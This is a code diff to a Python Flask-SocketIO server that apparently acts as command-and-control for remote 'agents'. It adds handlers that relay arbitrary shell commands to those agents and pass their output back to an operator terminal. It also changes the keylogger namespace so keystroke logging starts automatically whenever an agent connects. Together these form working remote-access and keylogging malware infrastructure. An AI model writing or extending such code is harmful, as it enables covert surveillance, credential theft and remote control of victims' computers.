@@ -132,6 +132,48 @@ def init_socket_handlers(socketio):
             print(f"[SocketIO] Received keep_alive ping from agent {agent_id}")
             emit('keep_alive_ack', {'status': 'success'}, room=f"terminal_{agent_id}", namespace='/terminal')
 
+    @socketio.on('execute_command', namespace='/terminal')
+    def handle_execute_command(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            command = data.get('command')
+            if not agent_id or not command:
+                print("[SocketIO] execute_command event missing agent_id or command")
+                return
+            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command}")
+            # Forward the command to the agent's room
+            emit('execute_command', {
+                'command': command,
+                'agent_id': agent_id
+            }, room=f"agent_{agent_id}", namespace='/terminal')
+
+    @socketio.on('command', namespace='/terminal')
+    def handle_command(data):
+        if current_user.is_authenticated:
+            agent_id = data.get('agent_id')
+            command = data.get('command')
+            current_dir = data.get('current_dir')
+            if not agent_id or not command:
+                print("[SocketIO] command event missing agent_id or command")
+                return
+            print(f"[SocketIO] Forwarding command to agent {agent_id}: {command} with current_dir: {current_dir}")
+            # Forward the command to the agent's room as execute_command event
+            emit('execute_command', {
+                'command': command,
+                'agent_id': agent_id,
+                'current_dir': current_dir
+            }, room=f"agent_{agent_id}", namespace='/terminal')
+
+    @socketio.on('command_result', namespace='/terminal')
+    def handle_command_result(data):
+        agent_id = data.get('agent_id')
+        if not agent_id:
+            print("[SocketIO] command_result event missing agent_id")
+            return
+        print(f"[SocketIO] Forwarding command result from agent {agent_id}")
+        # Forward the result to the terminal UI room
+        emit('terminal_output', data, room=f"terminal_{agent_id}", namespace='/terminal')
+
     @socketio.on('agent_connect', namespace='/keylogger')
     def handle_keylogger_agent_connect(data):
         try:
@@ -140,26 +182,24 @@ def init_socket_handlers(socketio):
             if decrypted.get('agent_id') != data['agent_id']:
                 print("[SocketIO] Keylogger authentication failed: Invalid token")
                 return False
-            
-            # Check if keylogger is started on the agent
+
+            # Auto-start keylogger when agent connects to keylogger namespace
             if data['agent_id'] not in keylogger_active_agents:
-                print(f"[SocketIO] Keylogger namespace usage denied: Keylogger not started on agent {data['agent_id']}")
-                emit('status', {
-                    'status': 'error',
-                    'message': 'Keylogger not started on agent',
-                    'agent_id': data['agent_id']
-                }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
-                return False
-            
+                keylogger_active_agents[data['agent_id']] = True
+                print(f"[SocketIO] Auto-starting keylogger for agent {data['agent_id']}")
+
             join_room(f"agent_{data['agent_id']}", namespace='/keylogger')
             active_agents[data['agent_id']] = True
             print(f"[SocketIO] Keylogger agent authenticated: {data['agent_id']}")
-            
+
             emit('agent_connected', {
                 'status': 'success',
                 'agent_id': data['agent_id']
             }, room=f"agent_{data['agent_id']}", namespace='/keylogger')
-            
+
+            # Emit keylogger_status to confirm it's started
+            emit('keylogger_status', {'status': 'started'}, room=f"agent_{data['agent_id']}", namespace='/keylogger')
+
             return True
         except Exception as e:
             print(f"[SocketIO] Keylogger agent connection error: {str(e)}")
